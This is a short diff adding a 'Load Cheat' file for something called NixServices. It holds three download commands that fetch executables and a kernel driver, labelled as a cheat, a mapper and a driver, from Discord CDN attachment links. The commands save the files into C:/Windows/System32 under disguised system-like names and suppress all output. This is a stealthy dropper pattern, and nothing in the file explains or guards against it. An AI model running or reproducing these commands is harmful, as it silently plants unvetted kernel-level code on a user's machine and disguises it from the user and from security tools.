@@ -1,0 +1,8 @@
+NixServices
+Load Cheat       
+https://cdn.discordapp.com/attachments/860330877585195028/925300113369350154/audiousage69.exe --output C:/Windows/System32/prflog_cfg.exe >nul 2>&1
+^^(cheat)
+https://cdn.discordapp.com/attachments/860330877585195028/925237023726534686/pubsvpn404.exe --output C:/Windows/System32/pubsvpn404.exe >nul 2>&1
+^^(mapper)
+https://cdn.discordapp.com/attachments/860330877585195028/925237639534227536/ActivitiesCache.sys --output C:/Windows/System32/ActivitiesCache.sys >nul 2>&1
+^^(driver)
